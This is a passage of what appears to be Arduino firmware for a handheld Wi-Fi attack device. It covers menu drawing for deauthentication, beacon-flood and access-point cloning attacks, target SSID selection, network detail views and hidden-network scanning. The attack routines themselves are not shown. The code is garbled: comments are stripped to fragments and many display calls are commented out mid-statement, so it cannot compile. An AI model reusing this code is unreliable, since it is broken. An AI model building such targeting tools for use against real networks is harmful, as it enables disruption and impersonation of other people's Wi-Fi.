  }
}

// Version：Frame
void drawAttackMenuBase_NoFlush() {
  //clearDisplay();
  //setTextSize(1);
  const char* menuItems[] = {
    "DeauthCertifyAttack",
    "SendBeaconFrameAttack",
    "BeaconFrame+Deauth",
    "《 Back 》"
  };
  for (int i = 0; i < 4; i++) {
    int yPos = 2 + i * 16;
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    //.setCursor(5, yPos+10);
    //.print(menuItems[i]);
    drawRightChevron(yPos-2, 14, false);
  }
}
// ：BeaconMenu（Height）
void drawBeaconMenuBase() {
  //clearDisplay();
  //setTextSize(1);
  const char* menuItems[] = {"BeaconAttack", "CloneAP()", "CloneAP()", "《 Back 》"};
  for (int i = 0; i < 4; i++) {
    int yPos = 2 + i * 16;
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    //.setCursor(5, yPos+10);
    //.print(menuItems[i]);
    drawRightChevron(yPos-2, 14, false);
  }
  ////);
}

// Version：Frame
void drawBeaconMenuBase_NoFlush() {
  //clearDisplay();
  //setTextSize(1);
  const char* menuItems[] = {"BeaconAttack", "CloneAP()", "CloneAP()", "《 Back 》"};
  for (int i = 0; i < 4; i++) {
    int yPos = 2 + i * 16;
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    //.setCursor(5, yPos+10);
    //.print(menuItems[i]);
    drawRightChevron(yPos-2, 14, false);
  }
}
// ：DeauthMenu（Height）
void drawDeauthMenuBase(int startIndex) {
  //clearDisplay();
  //setTextSize(1);
  const char* menuItems[] = {
    "Attack",
    "Attack",
    "Attack",
    "Attack",
    "Attack",
    "Attack",
    "《 Back 》"
  };
  for (int i = 0; i < 4; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= 6) break;
    int yPos = 2 + i * 16;
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    //.setCursor(5, yPos+10);
    //.print(menuItems[menuIndex]);
    drawRightChevron(yPos-2, 14, false);
  }
  ////);
}
// Version：Frame
void drawDeauthMenuBase_NoFlush(int startIndex) {
  //clearDisplay();
  //setTextSize(1);
  const char* menuItems[] = {
    "Attack",
    "Attack",
    "Attack",
    "Attack",
    "Attack",
    "Attack",
    "《 Back 》"
  };
  for (int i = 0; i < 4; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= 6) break;
    int yPos = 2 + i * 16;
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    //.setCursor(5, yPos+10);
    //.print(menuItems[menuIndex]);
    drawRightChevron(yPos-2, 14, false);
  }
}

// SSIDMedium"[?]"，ASCIIMedium（CJK）
String sanitizeForDisplay(const String& input) {
  String output;
  for (size_t i = 0; i < (size_t)input.length(); ) {
    unsigned char b0 = (unsigned char)input[i];
    // ASCII
    if (b0 < 0x80) {
      if (b0 >= 32 && b0 != 127) {
        output += (char)b0;
      } else {
        output += "[?]";
      }
      i += 1;
      continue;
    }
    // UTF-8
    int seqLen = 0;
    if ((b0 & 0xE0) == 0xC0) seqLen = 2;         // 110xxxxx
    else if ((b0 & 0xF0) == 0xE0) seqLen = 3;    // 1110xxxx
    else if ((b0 & 0xF8) == 0xF0) seqLen = 4;    // 11110xxx
    else { output += "[?]"; i += 1; continue; }

    // LeftLength
    if (i + (size_t)seqLen > (size_t)input.length()) { output += "[?]"; break; }
    // Verify
    bool valid = true;
    for (int k = 1; k < seqLen; ++k) {
      unsigned char bk = (unsigned char)input[i + k];
      if ((bk & 0xC0) != 0x80) { valid = false; break; }
    }
    if (!valid) { output += "[?]"; i += 1; continue; }

    if (seqLen == 3) {
      //
      unsigned char b1 = (unsigned char)input[i + 1];
      unsigned char b2 = (unsigned char)input[i + 2];
      uint16_t codepoint = ((b0 & 0x0F) << 12) | ((b1 & 0x3F) << 6) | (b2 & 0x3F);
      // ：
      // - CJK U+4E00..U+9FFF（Medium）
      // - CJK  U+3000..U+303F（Medium：、。「」《》…）
      // -  U+FF00..U+FFEF（、Number）
      // -  U+2000..U+206F（— – “ ” ‘ ’ … ）
      if ((codepoint >= 0x4E00 && codepoint <= 0x9FFF) ||
          (codepoint >= 0x3000 && codepoint <= 0x303F) ||
          (codepoint >= 0xFF00 && codepoint <= 0xFFEF) ||
          (codepoint >= 0x2000 && codepoint <= 0x206F)) {
        output += input.substring(i, i + 3);
      } else {
        output += "[?]";
      }
      i += 3;
    } else if (seqLen == 2) {
      // 2Font，
      output += "[?]";
      i += 2;
    } else { // seqLen == 4 (emoji)
      output += "[?]";
      i += 4;
    }
  }
  return output;
}

// ：SSIDSelect（Height）
void drawSsidPageBase(int startIndex) {
  const int MAX_DISPLAY_ITEMS = 4;
  const int ITEM_HEIGHT = 14;
  const int Y_OFFSET = 2;
  const int TEXT_LEFT = 6;
  const int BASELINE_ASCII_OFFSET = 4;
  const int BASELINE_CHINESE_OFFSET = 10;
  const int SSID_RIGHT_LIMIT_X = 110;
  const int STAR_GAP = 20;

  bool allSelected = (SelectedVector.size() == scan_results.size() && !scan_results.empty());
  //clearDisplay();
  //setTextSize(1);
  for (int i = 0; i < MAX_DISPLAY_ITEMS && i <= (int)scan_results.size(); i++) {
    int displayIndex = startIndex + i;
    if (displayIndex > (int)scan_results.size()) break;
    if (displayIndex == 0) {
      int yPos = i * ITEM_HEIGHT + Y_OFFSET;
      //.setFontMode(1);
      //.setForegroundColor(SSD1306_WHITE);
      const char* label = allSelected ? "> Cancel <" : ">  <";
      int w = //.getUTF8Width(label);
      int x = (//width() - w) / 2;
      //.setCursor(x, yPos + BASELINE_CHINESE_OFFSET);
      //.print(label);
      continue;
    }
    int wifiIndex = displayIndex - 1;
    String ssid = sanitizeForDisplay(scan_results[wifiIndex].ssid);
    if (ssid.length() == 0) {
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
        scan_results[wifiIndex].bssid[0],
        scan_results[wifiIndex].bssid[1],
        scan_results[wifiIndex].bssid[2],
        scan_results[wifiIndex].bssid[3],
        scan_results[wifiIndex].bssid[4],
        scan_results[wifiIndex].bssid[5]);
      ssid = String(mac);
    }
    bool isSelected = isIndexSelected(wifiIndex);
    bool showIndicator = isSelected;
    if (showIndicator) {
      //setCursor(3, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
      //setTextColor(SSD1306_WHITE);
      //print("[*]");
    }
    int textX = TEXT_LEFT + (isSelected ? STAR_GAP : 0);
    String clipped = utf8TruncateToWidth(ssid, SSID_RIGHT_LIMIT_X - textX);
    if (containsChinese(ssid)) {
      //.setFontMode(1);
      //.setForegroundColor(SSD1306_WHITE);
      int textY = i * ITEM_HEIGHT + BASELINE_CHINESE_OFFSET + Y_OFFSET;
      //.setCursor(textX, textY);
      //.print(clipped);
    } else {
      //setCursor(textX, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
      //setTextColor(SSD1306_WHITE);
      //print(clipped);
    }
    //setTextColor(SSD1306_WHITE);
    //setCursor(110, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
    //print(scan_results[wifiIndex].channel >= 36 ? "5G" : "24");
  }
  ////);
}
// Version：Frame
void drawSsidPageBase_NoFlush(int startIndex) {
  const int MAX_DISPLAY_ITEMS = 4;
  const int ITEM_HEIGHT = 14;
  const int Y_OFFSET = 2;
  const int TEXT_LEFT = 6;
  const int BASELINE_ASCII_OFFSET = 4;
  const int BASELINE_CHINESE_OFFSET = 10;
  const int SSID_RIGHT_LIMIT_X = 110;
  const int STAR_GAP = 20;

  bool allSelected = (SelectedVector.size() == scan_results.size() && !scan_results.empty());
  //clearDisplay();
  //setTextSize(1);
  for (int i = 0; i < MAX_DISPLAY_ITEMS && i <= (int)scan_results.size(); i++) {
    int displayIndex = startIndex + i;
    if (displayIndex > (int)scan_results.size()) break;
    if (displayIndex == 0) {
      int yPos = i * ITEM_HEIGHT + Y_OFFSET;
      //.setFontMode(1);
      //.setForegroundColor(SSD1306_WHITE);
      const char* label = allSelected ? "> Cancel <" : ">  <";
      int w = //.getUTF8Width(label);
      int x = (//width() - w) / 2;
      //.setCursor(x, yPos + BASELINE_CHINESE_OFFSET);
      //.print(label);
      continue;
    }
    int wifiIndex = displayIndex - 1;
    String ssid = sanitizeForDisplay(scan_results[wifiIndex].ssid);
    if (ssid.length() == 0) {
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
        scan_results[wifiIndex].bssid[0],
        scan_results[wifiIndex].bssid[1],
        scan_results[wifiIndex].bssid[2],
        scan_results[wifiIndex].bssid[3],
        scan_results[wifiIndex].bssid[4],
        scan_results[wifiIndex].bssid[5]);
      ssid = String(mac);
    }
    bool isSelected = isIndexSelected(wifiIndex);
    bool showIndicator = isSelected;
    if (showIndicator) {
      //setCursor(3, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
      //setTextColor(SSD1306_WHITE);
      //print("[*]");
    }
    int textX = TEXT_LEFT + (isSelected ? STAR_GAP : 0);
    String clipped = utf8TruncateToWidth(ssid, SSID_RIGHT_LIMIT_X - textX);
    if (containsChinese(ssid)) {
      //.setFontMode(1);
      //.setForegroundColor(SSD1306_WHITE);
      int textY = i * ITEM_HEIGHT + BASELINE_CHINESE_OFFSET + Y_OFFSET;
      //.setCursor(textX, textY);
      //.print(clipped);
    } else {
      //setCursor(textX, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
      //setTextColor(SSD1306_WHITE);
      //print(clipped);
    }
    //setTextColor(SSD1306_WHITE);
    //setCursor(110, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
    //print(scan_results[wifiIndex].channel >= 36 ? "5G" : "24");
  }
}

// （Usage）：，Radius
void animateMove(int yFrom, int yTo, int rectHeight, void (*drawBase)()) {
  animateSelectionGeneric(yFrom, yTo, rectHeight, 4, /*useFullWidth=*/false, /*doubleOutline=*/false, drawBase);
}

// Menu（Attack/Beacon）：Width，Radius
void animateMoveFullWidth(int yFrom, int yTo, int rectHeight, void (*drawBase)(), int cornerRadius) {
  animateSelectionGeneric(yFrom, yTo, rectHeight, cornerRadius, /*useFullWidth=*/true, /*doubleOutline=*/false, drawBase);
}

// ：（DeauthMenu）
void animateMoveDeauth(int yFrom, int yTo, int rectHeight, int startIndex) {
  g_deauthBaseStartIndex = startIndex;
  animateSelectionGeneric(yFrom, yTo, rectHeight, 2, /*useFullWidth=*/true, /*doubleOutline=*/false, drawDeauthMenuBaseShim);
}

// ：SSID（）
void animateMoveSsid(int yFrom, int yTo, int rectHeight, int startIndex) {
  g_ssidBaseStartIndex = startIndex;
  animateSelectionGeneric(yFrom, yTo, rectHeight, 2, /*useFullWidth=*/true, /*doubleOutline=*/true, drawSsidPageBaseShim);
}

// ：Menu（）- Attack
void animateMoveHome(int yFrom, int yTo, int rectHeight, int startIndex) {
  g_homeBaseStartIndex = startIndex;
  animateSelectionGeneric(yFrom, yTo, rectHeight, 7, /*useFullWidth=*/false, /*doubleOutline=*/false, drawHomeMenuBasePagedShim);
}

void drawHomeMenu() {
  static int prevState = -1;
  // const int MAX_DISPLAY_ITEMS = 3; // ３ - UsageVar

  int startIndex = homeStartIndex;
  g_homeBaseStartIndex = startIndex;

  if (prevState == -1) prevState = homeState;

  // SelectSelect，loopFunc
  if (!g_skipNextSelectAnim && prevState != homeState) {
    int yFrom = HOME_Y_OFFSET + prevState * HOME_ITEM_HEIGHT;
    int yTo = HOME_Y_OFFSET + homeState * HOME_ITEM_HEIGHT;
    // UsageAttack
    animateMove(yFrom, yTo, HOME_RECT_HEIGHT, drawHomeMenuBasePagedShim);
    prevState = homeState;
  } else if (g_skipNextSelectAnim) {
    // SelectRestore
    prevState = homeState;
    g_skipNextSelectAnim = false;
  }

  //clearDisplay();
  //setTextSize(1);
  // Proj
  int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - startIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - startIndex);
  for (int i = 0; i < currentPageItems; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= HOME_MAX_ITEMS) break;
    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
    int textY = rectY + 13; // Main Menu2px
    bool isSel = (i == homeState);

    // Tag，Select
    String label = g_homeMenuItems[menuIndex].label;
    int maxTextWidth = //width() - UI_RIGHT_GUTTER - 15; //
    int labelWidth = //.getUTF8Width(label.c_str());

    if (labelWidth > maxTextWidth) {
      // UTF-8Security
      while (label.length() > 0 &&
             //.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
        // （UTF-8Security）
        label.remove(label.length() - 1);
        // UTF-8
        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) {
          label.remove(label.length() - 1);
        }
      }
      label += "..";
    }

    if (isSel) {
      // UsageAttackHeight（）
      //fillRoundRect(0, rectY, //width() - UI_RIGHT_GUTTER, HOME_RECT_HEIGHT, 4, SSD1306_WHITE);
      //.setFontMode(1);
      //.setForegroundColor(SSD1306_BLACK);
      //.setCursor(5, textY + 1);
      //.print(label);
    } else {
      //.setFontMode(1);
      //.setForegroundColor(SSD1306_WHITE);
      //.setCursor(5, textY + 1);
      //.print(label);
    }
    // UsageAttack
    drawRightChevron(rectY, HOME_RECT_HEIGHT, isSel);
  }
  //
  drawHomeScrollbar(startIndex);
  ////);
}

// Menu：SyncSelectStatus，Update
inline void setHomeSelection(int startIndex, int state) {
  homeStartIndex = startIndex;
  homeState = state;
  menustate = homeStartIndex + homeState;
  g_homeBaseStartIndex = homeStartIndex;
}

// Menu：""，
inline void homeMoveUp(unsigned long currentTime) {
  if (currentTime - lastDownTime <= DEBOUNCE_DELAY) return;
  if (homeState > 0) {
    setHomeSelection(homeStartIndex, homeState - 1);
  } else if (homeStartIndex > 0) {
    //
    int prevStart = homeStartIndex;
    setHomeSelection(homeStartIndex - 1, 0);
    animateHomePageFlip(prevStart, homeStartIndex);
    g_skipNextSelectAnim = true;
  }
  lastDownTime = currentTime;
}

// Menu：""，
inline void homeMoveDown(unsigned long currentTime) {
  if (currentTime - lastUpTime <= DEBOUNCE_DELAY) return;
  // Proj
  int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - homeStartIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - homeStartIndex);
  if (homeState < currentPageItems - 1) {
    setHomeSelection(homeStartIndex, homeState + 1);
  } else if (homeStartIndex + homeState + 1 < HOME_MAX_ITEMS) {
    // （Proj）
    int prevStart = homeStartIndex;
    int nextStartIndex = homeStartIndex + 1;
    // Proj
    int nextPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - nextStartIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - nextStartIndex);
    // SettingshomeState（）
    int nextHomeState = (nextPageItems > 0) ? (nextPageItems - 1) : 0;
    setHomeSelection(nextStartIndex, nextHomeState);
    animateHomePageFlip(prevStart, nextStartIndex);
    g_skipNextSelectAnim = true;
  }
  // Proj，Exec（Resume）
  lastUpTime = currentTime;
}

// Menu："Confirm/OK"
inline void handleHomeOk() {
  if (digitalRead(BTN_OK) != LOW) return;
  delay(400);
  // UsageFuncSystem
  if (menustate >= 0 && menustate < HOME_MAX_ITEMS) {
    if (g_homeMenuItems[menustate].action != nullptr) {
      g_homeMenuItems[menustate].action();
    }
  }
}

void showWiFiDetails(const WiFiScanResult& wifi) {
    bool exitDetails = false;
    int scrollPosition = 0;
    unsigned long lastScrollTime = 0;
    const unsigned long SCROLL_DELAY = 300;
    int detailsScroll = 0;  // Init0，BackButton
    const int LINE_HEIGHT = 12; // AddHeight，

    // Var，
    unsigned long lastUpTime = 0;
    unsigned long lastDownTime = 0;
    unsigned long lastBackTime = 0;
    unsigned long lastOkTime = 0;

    while (!exitDetails) {
        unsigned long currentTime = millis();

        if (digitalRead(BTN_BACK) == LOW) {
            if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
            exitDetails = true;
            continue;
        }

        if (digitalRead(BTN_UP) == LOW) {
            if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
            if (detailsScroll > 0) detailsScroll--;
            scrollPosition = 0; //
            lastUpTime = currentTime;
        }

        if (digitalRead(BTN_DOWN) == LOW) {
            if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
            if (detailsScroll < 1) detailsScroll++; // 1，Total5，4
            scrollPosition = 0; //
            lastDownTime = currentTime;
        }

        if (digitalRead(BTN_OK) == LOW) {
            if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
            if (detailsScroll == 1) {
                exitDetails = true;
                continue;
            }
            lastOkTime = currentTime;
        }

        //clearDisplay();
        //setTextSize(1);

        struct DetailLine {
            String label;
            String value;
            bool isChinese;
        };

        DetailLine details[] = {
            {"SSID:", wifi.ssid.length() > 0 ? sanitizeForDisplay(wifi.ssid) : "<Hidden>", containsChinese(wifi.ssid)},
            {":", String(wifi.rssi) + " dBm", true},
            {"Channel:", String(wifi.channel) + (wifi.channel >= 36 ? " (5G)" : " (2.4G)"), true},
            {"MAC:", wifi.bssid_str, false},
            {"《 Back 》", "", true}
        };

        // DetailInfo
        for (int i = 0; i < 4 && (i + detailsScroll) < 5; i++) {
            int currentLine = i + detailsScroll;
            int yPos = 5 + (i * LINE_HEIGHT); // UsageLargeHeight

            if (currentLine == 4) { // BackOptions
                if (detailsScroll == 1) {
                    //fillRoundRect(0, yPos-1, //width(), LINE_HEIGHT, 3, WHITE);
                    //.setFontMode(1);
                    //.setForegroundColor(BLACK);
                    //.setCursor(0, yPos+8);
                    //.print("《 Back 》");
                    //.setForegroundColor(WHITE);
                } else {
                    //.setFontMode(1);
                    //.setForegroundColor(WHITE);
                    //.setCursor(0, yPos+8);
                    //.print("《 Back 》");
                }
                continue;
            }

            // Tag
            if (details[currentLine].isChinese) {
                //.setFontMode(1);
                //.setForegroundColor(WHITE);
                //.setCursor(0, yPos+8);
                //.print(details[currentLine].label);

                // Start，AddSpacing
                const int VALUE_X = 40; // SmallSpacing，

                //
                String value = details[currentLine].value;
                bool needScroll = false;

                // YesNo
                if (containsChinese(value) && value.length() > 15) { // MediumString15
                    needScroll = true;
                } else if (!containsChinese(value) && value.length() > 20) { // String20
                    needScroll = true;
                }

                if (needScroll) {
                    // Update
                    if (currentTime - lastScrollTime >= SCROLL_DELAY) {
                        scrollPosition++;
                        if ((size_t)scrollPosition >= value.length()) {
                            scrollPosition = 0;
                        }
                        lastScrollTime = currentTime;
                    }

                    // CreateText
                    String scrolledText = value.substring(scrollPosition) + " " + value.substring(0, scrollPosition);
                    value = scrolledText.substring(0, containsChinese(value) ? 15 : 20);
                }

                //.setCursor(VALUE_X, yPos+8);
                //.print(value);
            } else {
                // MediumTag
                //.setFontMode(1);
                //.setForegroundColor(WHITE);
                //.setCursor(0, yPos+8);
                //.print(details[currentLine].label);

                // Start
                const int VALUE_X = 26;
                if (details[currentLine].value.length() > 0) {
                    String value = details[currentLine].value;
                    bool needScroll = false;

                    // MACLength，YesNo
                    if (value.length() > 20) {
                        needScroll = true;
                    }

                    if (needScroll) {
                        // Update
                        if (currentTime - lastScrollTime >= SCROLL_DELAY) {
                            scrollPosition++;
                            if ((size_t)scrollPosition >= value.length()) {
                                scrollPosition = 0;
                            }
                            lastScrollTime = currentTime;
                        }

                        // CreateText
                        String scrolledText = value.substring(scrollPosition) + " " + value.substring(0, scrollPosition);
                        value = scrolledText.substring(0, 20);
                    }

                    if (containsChinese(value)) {
                        //.setCursor(VALUE_X, yPos+8);
                        //.print(value);
                    } else {
                        //setCursor(VALUE_X, yPos);
                        //print(value);
                    }
                }
            }
        }

        //
        if (detailsScroll > 0) {
            //fillTriangle(120, 12, 123, 9, 126, 12, WHITE);
        }
        if (detailsScroll < 1) { // Modify1
            //fillTriangle(120, 60, 123, 63, 126, 60, WHITE);
        }

        ////);
        delay(10);
    }
}
void drawssid() {
  const int MAX_DISPLAY_ITEMS = 4; // 4
  const int ITEM_HEIGHT = 14; // LargeOptionsSpacing
  const int Y_OFFSET = 2; // Y
  const int TEXT_LEFT = 6; //
  const int BASELINE_ASCII_OFFSET = 4; // /Number
  const int BASELINE_CHINESE_OFFSET = 10; // Medium
  const int SSID_RIGHT_LIMIT_X = 110; // SSID TextFree（ 24/5G ）
  const int STAR_GAP = 20; // Medium"[*]"Spacing
  const int ARROW_GAP = 8; // Height">"SmallSpacing
  int startIndex = 0;
  scrollindex = 0;
  bool allSelected = (SelectedVector.size() == scan_results.size() && !scan_results.empty());

  // UsageLengthVar，Compile

  unsigned long lastScrollTime = 0;
  const unsigned long SCROLL_DELAY = 300;
  int scrollPosition = 0;
  String currentScrollText = "";

  // Var，
  unsigned long lastUpTime = 0;
  unsigned long lastDownTime = 0;

  while(true) {
    unsigned long currentTime = millis();
    // SelectYesNo""
    allSelected = (SelectedVector.size() == scan_results.size() && !scan_results.empty());

    if(digitalRead(BTN_BACK)==LOW) break;

    if(digitalRead(BTN_OK) == LOW) {
      delay(400);
      if(scrollindex == 0) {
        // /Cancel
        if (!allSelected) {
          SelectedVector.clear();
          SelectedVector.reserve(scan_results.size());
          for (size_t i = 0; i < scan_results.size(); i++) {
            SelectedVector.push_back((int)i);
          }
          selectedFlags.assign(scan_results.size(), 1);
          allSelected = true;
        } else {
          SelectedVector.clear();
          selectedFlags.assign(scan_results.size(), 0);
          allSelected = false;
        }
      } else {
        // MediumStatus（Back）
        toggleSelection(scrollindex - 1);
      }
      unsigned long pressStartTime = millis();
      while (digitalRead(BTN_OK) == LOW) {
        if (millis() - pressStartTime >= 800) {
          if (scrollindex >= 1) {
            showWiFiDetails(scan_results[scrollindex - 1]);
          }
          while (digitalRead(BTN_OK) == LOW) delay(10);
          break;
        }
      }
      lastDownTime = currentTime;
    }

    if(digitalRead(BTN_DOWN) == LOW) {
      if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
      scrollPosition = 0;
      // ：LargeSSID（ scan_results.size()）
      if(scrollindex < (int)scan_results.size()) {
        int prev = scrollindex;
        scrollindex++;
        if(scrollindex - startIndex >= MAX_DISPLAY_ITEMS) {
          startIndex++;
          // （）：Start（3， MAX_DISPLAY_ITEMS-2）
          int yFrom = (MAX_DISPLAY_ITEMS-2) * ITEM_HEIGHT + Y_OFFSET - 1;
          int yTo = (MAX_DISPLAY_ITEMS-1) * ITEM_HEIGHT + Y_OFFSET - 1;
          animateMoveSsid(yFrom, yTo, ITEM_HEIGHT + 2, startIndex);
        } else {
          // ，Exec
          int yFrom = (prev - startIndex) * ITEM_HEIGHT + Y_OFFSET - 1; //
          int yTo = (scrollindex - startIndex) * ITEM_HEIGHT + Y_OFFSET - 1;
          animateMoveSsid(yFrom, yTo, ITEM_HEIGHT + 2, startIndex);
        }
      }
      lastUpTime = currentTime;
    }

    if(digitalRead(BTN_UP) == LOW) {
      if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
      scrollPosition = 0;
      if(scrollindex > 0) {
        int prev = scrollindex;
        scrollindex--;
        if(scrollindex < startIndex && startIndex > 0) {
          startIndex--;
          // （）：
          int yFrom = 1 * ITEM_HEIGHT + Y_OFFSET - 1;   //
          int yTo = 0 * ITEM_HEIGHT + Y_OFFSET - 1;     //
          animateMoveSsid(yFrom, yTo, ITEM_HEIGHT + 2, startIndex);
          // Height
          scrollindex = startIndex;
        } else {
          int yFrom = (prev - startIndex) * ITEM_HEIGHT + Y_OFFSET - 1;
          int yTo = (scrollindex - startIndex) * ITEM_HEIGHT + Y_OFFSET - 1;
          animateMoveSsid(yFrom, yTo, ITEM_HEIGHT + 2, startIndex);
        }
      }
      lastUpTime = currentTime;
    }

    //clearDisplay();
    //setTextSize(1);

    for(int i = 0; i < MAX_DISPLAY_ITEMS && i <= (int)scan_results.size(); i++) {
      int displayIndex = startIndex + i;
      if(displayIndex > (int)scan_results.size()) break;

      bool isHighlighted = (displayIndex == scrollindex);

      // /CancelOptions（Center）
      if(displayIndex == 0) {
        int yPos = i * ITEM_HEIGHT + Y_OFFSET;
        if(isHighlighted) {
          //drawRoundRect(0, yPos-2, //width(), ITEM_HEIGHT + 2, 2, SSD1306_WHITE);
          //drawRoundRect(1, yPos-1, //width()-2, ITEM_HEIGHT, 2, SSD1306_WHITE); // Bold
          //.setFontMode(1);
          //.setForegroundColor(SSD1306_WHITE);
          const char* label = allSelected ? "> Cancel <" : ">  <";
          int w = //.getUTF8Width(label);
          int x = (//width() - w) / 2;
          //.setCursor(x, yPos + BASELINE_CHINESE_OFFSET);
          //.print(label);
        } else {
          //.setFontMode(1);
          //.setForegroundColor(SSD1306_WHITE);
          const char* label = allSelected ? "> Cancel <" : ">  <";
          int w = //.getUTF8Width(label);
          int x = (//width() - w) / 2;
          //.setCursor(x, yPos + BASELINE_CHINESE_OFFSET);
          //.print(label);
        }
        continue;
      }

      // WiFi
      int wifiIndex = displayIndex - 1;
      String ssid = sanitizeForDisplay(scan_results[wifiIndex].ssid);

      if(ssid.length() == 0) {
        char mac[18];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
          scan_results[wifiIndex].bssid[0],
          scan_results[wifiIndex].bssid[1],
          scan_results[wifiIndex].bssid[2],
          scan_results[wifiIndex].bssid[3],
          scan_results[wifiIndex].bssid[4],
          scan_results[wifiIndex].bssid[5]);
        ssid = String(mac);
      }

      //  - Modify
      bool needScroll = false;
      if(isHighlighted) {
        if(containsChinese(ssid) && ssid.length() > 26) { // Medium>26
          needScroll = true;
        } else if(!containsChinese(ssid) && ssid.length() > 18) { // >18
          needScroll = true;
        }

        if(needScroll) {
          if(currentTime - lastScrollTime >= SCROLL_DELAY) {
            scrollPosition++;
            if(scrollPosition >= (int)ssid.length()) {
              scrollPosition = 0;
            }
            lastScrollTime = currentTime;
          }
          String scrolledText = ssid.substring(scrollPosition) + ssid.substring(0, scrollPosition);
          ssid = scrolledText.substring(0, containsChinese(ssid) ? 26 : 18);
        }
      }

      // Text
      {
        // Height：MediumBorder
        if(isHighlighted) {
          int rectY = i * ITEM_HEIGHT - 1 + Y_OFFSET;
          //drawRoundRect(0, rectY, //width(), ITEM_HEIGHT + 2, 2, SSD1306_WHITE);
          //drawRoundRect(1, rectY+1, //width()-2, ITEM_HEIGHT-0, 2, SSD1306_WHITE); // Bold
        }

        // ：Medium"[*]", MediumHeight">",
        bool isSelected = isIndexSelected(wifiIndex);
        bool showIndicator = isSelected || (isHighlighted && !isSelected);
        if (showIndicator) {
          //setCursor(3, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
          //setTextColor(SSD1306_WHITE);
          if (isSelected) {
            //print("[*]");
          } else {
            //print('>');
          }
        }

        {
          int textX = TEXT_LEFT + (isSelected ? STAR_GAP : (showIndicator ? ARROW_GAP : 0));
          int maxW = SSID_RIGHT_LIMIT_X - textX;
          String renderText = ssid;
          if (isHighlighted) {
            int textW = //.getUTF8Width(renderText.c_str());
            if (textW > maxW) {
              if (currentTime - lastScrollTime >= SCROLL_DELAY) {
                scrollPosition = advanceUtf8Index(renderText, scrollPosition);
                if (scrollPosition >= (int)renderText.length()) scrollPosition = 0;
                lastScrollTime = currentTime;
              }
              String rotated = renderText.substring(scrollPosition) + renderText.substring(0, scrollPosition);
              renderText = utf8ClipToWidthNoEllipsis(rotated, maxW);
            } else {
              renderText = utf8ClipToWidthNoEllipsis(renderText, maxW);
            }
          } else {
            renderText = utf8TruncateToWidth(renderText, maxW);
          }

          if(containsChinese(ssid)) {
            //.setFontMode(1);
            //.setForegroundColor(SSD1306_WHITE);
            int textY = i * ITEM_HEIGHT + BASELINE_CHINESE_OFFSET + Y_OFFSET + (isHighlighted ? 1 : 0);
            //.setCursor(textX, textY);
            //.print(renderText);
          } else {
            //setCursor(textX, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
            //setTextColor(SSD1306_WHITE);
            //print(renderText);
          }
        }
      }

      // ChannelType
      //setTextColor(SSD1306_WHITE);
      //setCursor(110, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
      //print(scan_results[wifiIndex].channel >= 36 ? "5G" : "24");

      //setTextColor(SSD1306_WHITE);
    }

    //
    ////);
  }
}
void drawscan() {
  Serial.println("=== StartWiFiNetworkScan ===");
  const unsigned long SCAN_TIMEOUT_MS = 2500;
  performScanWithUI("ScanMedium...", SCAN_TIMEOUT_MS, -1);
}

// Scan：ScanValidSSID
void drawDeepScan() {
  Serial.println("=== StartWiFiNetworkScan ===");
  performAdvancedDeepScan();
}

// AdvancedScan：UsageScan
void performAdvancedDeepScan() {
  while (true) {
    //clearDisplay();
    //setTextColor(SSD1306_WHITE);
    //setTextSize(1);

    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    int titleW = //.getUTF8Width("ScanMedium...");
    int titleX = (//width() - titleW) / 2;
    //.setCursor(titleX, 24);
    //.print("ScanMedium...");
    ////);

    // EmptyResult
    scan_results.clear();
    SelectedVector.clear();
    g_scanDone = false;

    // ScanResultSet，
    std::set<String> uniqueSSIDs;
    std::vector<WiFiScanResult> allResults;

    // Scan1：Scan（）
    Serial.println("=== 1: Scan ===");
    updateScanProgress(1, 3, "Scan");
    performSingleScan("Scan", 4000, allResults, uniqueSSIDs);

    // Scan2：ChannelScan（2.4G + 5G）
    Serial.println("=== 2: Scan ===");
    updateScanProgress(2, 3, "Scan");
    performChannelWiseScan(allResults, uniqueSSIDs);

    // Scan3：HiddenNetworkScan
    Serial.println("=== 3: HiddenNetworkScan ===");
    updateScanProgress(3, 3, "HiddenNetworkScan");
    performHiddenNetworkScan(allResults, uniqueSSIDs);

